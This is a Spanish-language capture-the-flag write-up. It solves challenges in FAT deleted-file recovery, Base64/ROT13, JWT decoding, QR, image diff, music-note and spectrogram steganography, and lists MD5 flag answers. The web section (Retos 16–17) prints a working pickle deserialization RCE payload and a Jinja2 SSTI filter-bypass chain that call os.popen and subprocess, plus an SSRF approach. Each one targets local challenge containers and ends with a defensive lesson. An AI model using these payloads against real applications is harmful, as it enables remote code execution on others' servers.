Resumen y formato de banderas

Según las reglas del CTF, toda respuesta se envía como FLAG{ md5(respuesta) }: la "respuesta real" encontrada en cada reto se cifra con MD5 y el hash se encierra en FLAG{...}. Entorno de trabajo: Windows 11 + Git Bash; herramientas estándar (file, xxd, dd, openssl, md5sum) y utilidades propias en Node.js para suplir la ausencia de Python/ImageMagick/ffmpeg.

Proceso detallado por reto

Reto 2 — Entrega el equipo FORENSE

Evidencia: usb_lab.img · Herramientas: file, xxd, dd, md5sum

Proceso

  1. Identificar el sistema de archivos: 
    file usb_lab.img    # DOS/MBR, FAT16, etiqueta "LAB_USB"
  2. Calcular la posición del directorio raíz: sector 1 + (2 FAT × 191) = sector 383 (offset 0x2FE00). Área de datos: sector 415.
  3. Volcar el directorio raíz y buscar entradas borradas (primer byte 0xE5): 
    xxd -s $((383*512)) -l 1024 usb_lab.img
    Se halla la entrada respaldo_privado.png marcada con 0xE5 (cluster 15, 13 560 bytes).
  4. Recuperar el archivo (carving). En FAT, borrar solo marca la entrada y libera la cadena FAT; los datos siguen en disco. El cluster 15 corresponde al sector 415 + (15−2) = 428: 
    dd if=usb_lab.img of=respaldo_privado.png bs=1 \
   skip=$(((415+15-2)*512)) count=$((0x34f8)) status=none
    El PNG sale íntegro y muestra en pantalla: FLAG{borrar_no_es_destruir}.
  5. Aplicar el formato del CTF: 
    printf 'borrar_no_es_destruir' | md5sum
# 1d9b3ce7d2e720aded00119d860d5dd3
FLAG{1d9b3ce7d2e720aded00119d860d5dd3}
Lección: borrar no es destruir; el dato persiste hasta sobrescribirse (recuperable con Recuva/PhotoRec/Autopsy).

Reto 4 — Mensaje en capas CRYPTO

Entrada: U1lOVHt5YnBiZmNiZXJhcGV2Y2duZX0= · Herramientas: base64, tr (ROT13)

Proceso

  1. La cadena termina en = → es Base64. Se decodifica: 
    echo 'U1lOVHt5YnBiZmNiZXJhcGV2Y2duZX0=' | base64 -d
# SYNT{ybpbfcberapevcgne}
  2. SYNT es FLAG desplazado 13 letras → ROT13: 
    echo 'SYNT{ybpbfcberapevcgne}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# FLAG{locosporencriptar}
  3. Respuesta locosporencriptar → MD5: 
    printf 'locosporencriptar' | md5sum   # b3826186c4f26cb2ec3d553c29a1d854
FLAG{b3826186c4f26cb2ec3d553c29a1d854}
Lección: SYNT{...} siempre indica ROT13.

Reto 5 — Token oculto CRYPTO

Herramientas: base64 (o jwt.io)

Proceso

  1. La cadena eyJ... con dos puntos es un JWT (header.payload.firma). Las dos primeras partes son solo Base64.
  2. Se decodifica el payload (parte central): 
    echo 'eyJzdWIiOiJEZW1hc2lhZG8gRmFjaWwgbGEgdmVyZGFkIiwiRkxBRyI6InN1YmFubGVsYWRpZmljdWx0YWQifQ==' | base64 -d
# {"sub":"Demasiado Facil la verdad","FLAG":"subanleladificultad"}
  3. Respuesta subanleladificultad → MD5: 
    printf 'subanleladificultad' | md5sum   # 14c30d7fda5f448f85cbb99e2bf0fb1d
FLAG{14c30d7fda5f448f85cbb99e2bf0fb1d}
Lección: un JWT no cifra; su payload es legible. Nunca guardar secretos ahí.

Reto 6 — Mira bien (QR) MISC

Evidencia: qr_url.png · Herramientas: lector de QR

Proceso

  1. Se escanea el QR con el celular → devuelve una URL: 
    dominio-completamente-falso.com/mira-bien?id=123456789&FLAG=FLAG%7Bestabafacilaceptalo%7D
  2. El valor de FLAG está URL-encoded: %7B={ y %7D=} → FLAG{estabafacilaceptalo}. El dominio es falso (no se visita).
  3. Respuesta estabafacilaceptalo → MD5: 
    printf 'estabafacilaceptalo' | md5sum   # 7d8164bfb5aea664e69bf3db6e99f0df
FLAG{7d8164bfb5aea664e69bf3db6e99f0df}
Lección: decodificar y leer un QR antes de abrir sus enlaces.

Reto 10 — Encuentra las diferencias MISC

Evidencia: original.png, alterada.png · Herramientas: decodificador PNG propio en Node.js

Proceso

  1. Al no haber ImageMagick/Python, se programó un decodificador PNG en Node.js que infla el zlib de los chunks IDAT y aplica el des-filtrado del formato PNG.
  2. Se comparan las dos imágenes píxel a píxel: 23 695 píxeles distintos concentrados en la franja y=339–402.
  3. Se exportan únicamente los píxeles diferentes como imagen en blanco/negro, revelando el texto oculto FLAG{dos_imagenes_un_secreto}. 
    node pngdiff.js original.png alterada.png        # localiza la franja de diferencias
node pngmake.js original.png alterada.png diff.png  # dibuja el texto oculto
  4. Respuesta dos_imagenes_un_secreto → MD5: 
    printf 'dos_imagenes_un_secreto' | md5sum   # 0bafe092da11756f0bf650e5b479c729
FLAG{0bafe092da11756f0bf650e5b479c729}
Lección: esteganografía por diferencia — un mensaje se esconde en cambios de píxel imperceptibles; el diff lo revela.

Reto 11 — Melodía con mensaje MISC

Evidencia: partitura_inglesa.png · Herramientas: análisis de imagen en Node.js

Proceso

  1. La partitura se titula "Hexadecimal Waltz for 0xC0FFEE": las notas musicales inglesas (A–G) coinciden con dígitos hexadecimales y deletrean una palabra.
  2. Se detectaron algorítmicamente las 5 líneas del pentagrama (y=78,85,92,99,106) y el centro de cada cabeza de nota, confirmando la secuencia final B-E-E-F.
  3. Combinado con el tema, la palabra es la constante hexadecimal clásica DEADBEEF (D-E-A-D-B-E-E-F). El 0xC0FFEE del subtítulo es un señuelo.
  4. Respuesta DEADBEEF → MD5: 
    printf 'DEADBEEF' | md5sum   # 7bc3a60fbf38e98f6fef654afa26d270
FLAG{7bc3a60fbf38e98f6fef654afa26d270}
Lección: las notas A–F = dígitos hex; una partitura puede codificar texto.

Reto 13 — A simple vista FORENSE

Evidencia: lee_la_cancion.wav · Herramientas: generador de espectrograma propio (Node.js + FFT)

Proceso

  1. El enunciado ("léelo") indica que el mensaje está en el espectrograma del audio (WAV PCM mono 44.1 kHz, 16-bit).
  2. Sin sox/ffmpeg, se implementó un generador de espectrograma en Node.js: se leen las muestras, se aplica una STFT (ventana Hann de 1024 muestras, salto de 256), FFT radix-2, y se renderiza la magnitud a una imagen (frecuencia vs. tiempo). 
    node spec.js lee_la_cancion.wav spec.png
  3. El espectrograma dibuja el texto FLAG{wowestoessupercool}.
  4. Respuesta wowestoessupercool → MD5: 
    printf 'wowestoessupercool' | md5sum   # 24c2886252fdd830c4fa3c80544d67b0
FLAG{24c2886252fdd830c4fa3c80544d67b0}
Lección: se puede escribir texto en el dominio de la frecuencia; un espectrograma (Audacity/Sonic Visualiser) lo hace visible.

Retos Web — explotación (15, 16, 17)

Los tres entregan un docker-compose.yml que apunta a imágenes públicas en Docker Hub (autor maosuarez). La metodología común: levantar la imagen localmente, leer el código fuente desde el contenedor, explotar la vulnerabilidad para ejecutar el binario /getflag, y aplicar MD5 al contenido que devuelve.

docker pull maosuarez/<imagen>:latest
docker run -d -p 800X:8000 maosuarez/<imagen>:latest
docker exec <c> cat /app/app.py     # leer el codigo -> ubicar la vulnerabilidad
# explotar -> /getflag imprime FLAG{tipo_hash}; la respuesta = contenido interno; MD5 -> flag final

Reto 15 — Health Checker WEB · SSRF

Imagen: maosuarez/ssrf-health-checker · Herramientas: Docker, curl

Proceso

  1. La app es un verificador que consulta URLs desde el servidor. Se abusa (SSRF) para alcanzar servicios internos (localhost / nombres de servicio Docker) y ejecutar /getflag.
  2. La flag del docker-compose.yml (de_verdad..._tan_facil) es un señuelo. El binario devuelve FLAG{ssrf_a17251c0b759f57d}.
  3. Respuesta ssrf_a17251c0b759f57d → MD5: 
    printf 'ssrf_a17251c0b759f57d' | md5sum   # 33944ccbc48a1c0170d71f908cfeae14
FLAG{33944ccbc48a1c0170d71f908cfeae14}
Lección: restringir los destinos de peticiones salientes (allow-list); no confiar en el origen "interno".

Reto 16 — Como te gusta WEB · Pickle

Imagen: maosuarez/pickle-prefs · Herramientas: Docker, curl

Proceso

  1. El código fuente revela pickle.loads(base64.b64decode(cookie 'prefs')) sin validación: deserialización insegura.
  2. Se forja una cookie con un objeto cuyo método __reduce__ ejecuta subprocess.check_output(['/getflag']); la salida se refleja en la respuesta. 
    docker exec pickle python -c "import pickle,base64,subprocess
class E:
    def __reduce__(self): return (subprocess.check_output, (['/getflag'],))
print(base64.b64encode(pickle.dumps(E())).decode())"
curl http://localhost:8002/ -b "prefs=<PAYLOAD>"   # -> FLAG{pickle_8a0b9308958289cc}
  3. Respuesta pickle_8a0b9308958289cc → MD5: 
    printf 'pickle_8a0b9308958289cc' | md5sum   # 604db99b954342cf324953c7a606cbe4
FLAG{604db99b954342cf324953c7a606cbe4}
Lección: nunca deserializar datos no confiables con pickle; usar JSON y firmar las cookies.

Reto 17 — Mucho gusto WEB · SSTI

Imagen: maosuarez/ssti-greeter · Herramientas: Docker, curl

Proceso

  1. El código concatena la entrada a la plantilla Jinja2: render_template_string("<h2>Hola, "+name+"!</h2>") → SSTI. Confirmación: /greet?name={{7*7}} devuelve 49.
  2. El filtro bloquea _ solo en name; se evade pasando los tokens con guion bajo por otros parámetros de la URL y referenciándolos con request.args.X: 
    /greet?name={{config|attr(request.args.a)|attr(request.args.b)
   |attr(request.args.c)|attr(request.args.g)("os")
   |attr("popen")("/getflag")|attr("read")()}}
   &a=__class__&b=__init__&c=__globals__&g=get
# -> FLAG{ssti_8a845419c06bae52}
  3. Respuesta ssti_8a845419c06bae52 → MD5: 
    printf 'ssti_8a845419c06bae52' | md5sum   # f55cc16f919378e35e2939353c57c12b
FLAG{f55cc16f919378e35e2939353c57c12b}
Lección: jamás concatenar entrada de usuario a una plantilla; un filtro de un solo carácter no detiene SSTI.
